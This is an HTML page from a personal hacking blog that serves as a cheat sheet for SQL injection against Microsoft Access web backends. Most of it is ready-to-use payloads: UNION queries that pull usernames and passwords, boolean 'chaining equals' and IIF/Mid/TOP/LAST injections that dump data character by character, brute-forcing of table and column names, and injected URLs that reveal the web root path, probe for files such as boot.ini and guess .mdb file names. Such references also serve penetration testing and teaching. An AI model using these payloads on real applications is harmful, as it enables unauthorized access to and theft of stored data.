<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> MS Access SQL Injection | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚛️</text></svg>" > <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/hacking/cheetsheets/sql-injection/access-sql-injection/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">bl0g </a> </li> <li class="nav-item active"> <a class="nav-link" href="/hacking/">h4Cking <span class="sr-only">(current)</span> </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">more </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/about/">about</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/repos/">repositories</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/misc/">miscelanea</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/cv/">Cv</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/news/">news</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"><div class="post"> <header class="post-header"> <h1 class="post-title">MS Access SQL Injection</h1> <p class="post-description"></p> </header> <article> <h2 id="online-playground">Online Playground</h2> <ul> <li><a href="https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format&amp;ss=-1">https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format\&amp;ss=-1</a></li> </ul> <h2 id="db-limitations">DB Limitations</h2> <h3 id="string-concatenation">String Concatenation</h3> <p>String concatenation is possible with <code class="language-plaintext highlighter-rouge">&amp; (%26)</code> and <code class="language-plaintext highlighter-rouge">+ (%2b)</code> characters.</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' UNION SELECT '</span><span class="n">web</span><span class="s1">' %2b '</span><span class="n">app</span><span class="s1">' FROM table%00
1'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="s1">'web'</span> <span class="o">%</span><span class="mi">26</span> <span class="s1">'app'</span> <span class="k">FROM</span> <span class="k">table</span><span class="o">%</span><span class="mi">00</span>
</code></pre></div></div> <h3 id="comments">Comments</h3> <p>There are no comments in MS access, but apparently it’s possible to remove the last of a query with a NULL char:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' union select 1,2 from table%00
</span></code></pre></div></div> <p>If this is not working you could always fix the syntax of the query:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' UNION SELECT 1,2 FROM table WHERE </span><span class="se">''</span><span class="s1">='</span>
</code></pre></div></div> <h3 id="stacked-queries">Stacked Queries</h3> <p>They aren’t supported.</p> <h3 id="limit">LIMIT</h3> <p>The <strong><code class="language-plaintext highlighter-rouge">LIMIT</code></strong> operator <strong>isn’t implemented</strong>. However, it’s possible to limit SELECT query results to the <strong>first N table rows using the <code class="language-plaintext highlighter-rouge">TOP</code> operator</strong>. <code class="language-plaintext highlighter-rouge">TOP</code> accepts as argument an integer, representing the number of rows to be returned.</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' UNION SELECT TOP 3 attr FROM table%00
</span></code></pre></div></div> <p>Just like TOP you can use <strong><code class="language-plaintext highlighter-rouge">LAST</code></strong> which will get the <strong>rows from the end</strong>.</p> <h2 id="union-queriessub-queries">UNION Queries/Sub queries</h2> <p>In a SQLi you usually will want to somehow execute a new query to extract information from other tables. MS Access always requires that in <strong>subqueries or extra queries a <code class="language-plaintext highlighter-rouge">FROM</code> is indicated</strong>.<br/> So, if you want to execute a <code class="language-plaintext highlighter-rouge">UNION SELECT</code> or <code class="language-plaintext highlighter-rouge">UNION ALL SELECT</code> or a <code class="language-plaintext highlighter-rouge">SELECT</code> between parenthesis in a condition, you always <strong>need to indicate a <code class="language-plaintext highlighter-rouge">FROM</code> with a valid table name</strong>.<br/> Therefore, you need to know a <strong>valid table name</strong>.</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="mi">1</span><span class="s1">' UNION SELECT username,password from users%00
</span></code></pre></div></div> <h3 id="chaining-equals--substring">Chaining equals + Substring</h3> <blockquote> <p>[!WARNING] This will allow you to exfiltrate values of the current table without needing to know the name of the table.</p> </blockquote> <p><strong>MS Access</strong> allows <strong>weird syntax</strong> such as <strong><code class="language-plaintext highlighter-rouge">'1'=2='3'='asd'=false</code></strong>. As usually the SQL injection will be inside a <strong><code class="language-plaintext highlighter-rouge">WHERE</code></strong> clause we can abuse that.</p> <p>Imagine you have a SQLi in a MS Access database and you know (or guessed) that one <strong>column name is username</strong>, and thats the field you want to <strong>exfiltrate</strong>. You could check the different responses of the web app when the chaining equals technique is used and potentially exfiltrate content with a <strong>boolean injection</strong> using the <strong><code class="language-plaintext highlighter-rouge">Mid</code></strong> function to get substrings.</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'=(Mid(username,1,3)='</span><span class="n">adm</span><span class="s1">')='</span>
</code></pre></div></div> <p>If you know the <strong>name of the table</strong> and <strong>column</strong> to dump you can use a combination between <code class="language-plaintext highlighter-rouge">Mid</code> , <code class="language-plaintext highlighter-rouge">LAST</code> and <code class="language-plaintext highlighter-rouge">TOP</code> to <strong>leak all the info</strong> via boolean SQLi:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='</span><span class="n">Alf</span><span class="s1">')='</span>
</code></pre></div></div> <p><em>Feel free to check this in the online playground.</em></p> <h3 id="brute-forcing-tables-names">Brute-forcing Tables names</h3> <p>Using the chaining equals technique you can also <strong>bruteforce table names</strong> with something like:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'=(select+top+1+'</span><span class="n">lala</span><span class="s1">'+from+&lt;table_name&gt;)='</span>
</code></pre></div></div> <p>You can also use a more traditional way:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="mi">1</span><span class="s1">' AND (SELECT TOP 1 &lt;table_name&gt;)%00
</span></code></pre></div></div> <p><em>Feel free to check this in the online playground.</em></p> <ul> <li>Sqlmap common table names: <a href="https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt">https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt</a></li> <li>There is another list in <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html</a></li> </ul> <h3 id="brute-forcing-columns-names">Brute-Forcing Columns names</h3> <p>You can <strong>brute-force current columns names</strong> with the chaining equals trick with:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'=column_name='</span>
</code></pre></div></div> <p>Or with a <strong>group by</strong>:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="mi">1</span><span class="s1">' GROUP BY column_name%00
</span></code></pre></div></div> <p>Or you can brute-force column names of a <strong>different table</strong> with:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'=(SELECT TOP 1 column_name FROM valid_table_name)='</span>

<span class="o">-</span><span class="mi">1</span><span class="s1">' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
</span></code></pre></div></div> <h3 id="dumping-data">Dumping data</h3> <p>We have already discussed the <a href="ms-access-sql-injection.md#chaining-equals-+-substring"><strong>chaining equals technique</strong></a> <strong>to dump data from the current and other tables</strong>. But there are other ways:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">IIF</span><span class="p">((</span><span class="k">select</span> <span class="n">mid</span><span class="p">(</span><span class="k">last</span><span class="p">(</span><span class="n">username</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="n">top</span> <span class="mi">10</span> <span class="n">username</span> <span class="k">from</span> <span class="n">users</span><span class="p">))</span><span class="o">=</span><span class="s1">'a'</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">'ko'</span><span class="p">)</span>
</code></pre></div></div> <p>In a nutshell, the query uses an “if-then” statement in order to trigger a “200 OK” in case of success or a “500 Internal Error” otherwise. Taking advantage of the TOP 10 operator, it is possible to select the first ten results. The subsequent usage of LAST allows to consider the 10th tuple only. On such value, using the MID operator, it is possible to perform a simple character comparison. Properly changing the index of MID and TOP, we can dump the content of the “username” field for all rows.</p> <h3 id="time-based">Time Based</h3> <p>Check <a href="https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN</a></p> <h3 id="other-interesting-functions">Other Interesting functions</h3> <ul> <li><code class="language-plaintext highlighter-rouge">Mid('admin',1,1)</code> get substring from position 1 length 1 (initial position is 1)</li> <li><code class="language-plaintext highlighter-rouge">LEN('1234')</code> get length of string</li> <li><code class="language-plaintext highlighter-rouge">ASC('A')</code> get ascii value of char</li> <li><code class="language-plaintext highlighter-rouge">CHR(65)</code> get string from ascii value</li> <li><code class="language-plaintext highlighter-rouge">IIF(1=1,'a','b')</code> if then</li> <li><code class="language-plaintext highlighter-rouge">COUNT(*)</code> Count number of items</li> </ul> <h2 id="enumerating-tables">Enumerating tables</h2> <p>From <a href="https://dataedo.com/kb/query/access/list-of-tables-in-the-database"><strong>here</strong></a> you can see a query to get tables names:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">MSysObjects</span><span class="p">.</span><span class="n">name</span>
<span class="k">from</span> <span class="n">MSysObjects</span>
<span class="k">where</span>
   <span class="n">MSysObjects</span><span class="p">.</span><span class="k">type</span> <span class="k">In</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span>
   <span class="k">and</span> <span class="n">MSysObjects</span><span class="p">.</span><span class="n">name</span> <span class="k">not</span> <span class="k">like</span> <span class="s1">'~*'</span>
   <span class="k">and</span> <span class="n">MSysObjects</span><span class="p">.</span><span class="n">name</span> <span class="k">not</span> <span class="k">like</span> <span class="s1">'MSys*'</span>
<span class="k">order</span> <span class="k">by</span> <span class="n">MSysObjects</span><span class="p">.</span><span class="n">name</span>
</code></pre></div></div> <p>However, note that is very typical to find SQL Injections where you <strong>don’t have access to read the table <code class="language-plaintext highlighter-rouge">MSysObjects</code></strong>.</p> <h2 id="filesystem-access">FileSystem access</h2> <h3 id="web-root-directory-full-path">Web Root Directory Full Path</h3> <p>The knowledge of the <strong>web root absolute path may facilitate further attacks</strong>. If application errors are not completely concealed, the directory path can be uncovered trying to select data from an inexistent database.</p> <p><code class="language-plaintext highlighter-rouge">http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00</code></p> <p>MS Access responds with an <strong>error message containing the web directory full pathname</strong>.</p> <h3 id="file-enumeration">File Enumeration</h3> <p>The following attack vector can be used to <strong>inferrer the existence of a file on the remote filesystem</strong>. If the specified file exists, MS Access triggers an error message informing that the database format is invalid:</p> <p><code class="language-plaintext highlighter-rouge">http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00</code></p> <p>Another way to enumerate files consists into <strong>specifying a database.table item</strong>. <strong>If</strong> the specified <strong>file exists</strong>, MS Access displays a <strong>database format error message</strong>.</p> <p><code class="language-plaintext highlighter-rouge">http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00</code></p> <h3 id="mdb-file-name-guessing">.mdb File Name Guessing</h3> <p><strong>Database file name (.mdb)</strong> can be inferred with the following query:</p> <p><code class="language-plaintext highlighter-rouge">http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00</code></p> <p>Where <strong>name[i] is a .mdb filename</strong> and <strong>realTable is an existent table</strong> within the database. Although MS Access will always trigger an error message, it is possible to distinguish between an invalid filename and a valid .mdb filename.</p> <h3 id="mdb-password-cracker">.mdb Password Cracker</h3> <p><a href="https://www.nirsoft.net/utils/accesspv.html"><strong>Access PassView</strong></a> is a free utility that can be used to recover the main database password of Microsoft Access 95/97/2000/XP or Jet Database Engine 3.0/4.0.</p> <h2 id="references">References</h2> <ul> <li><a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html</a></li> </ul> </article> </div> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> &copy; Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>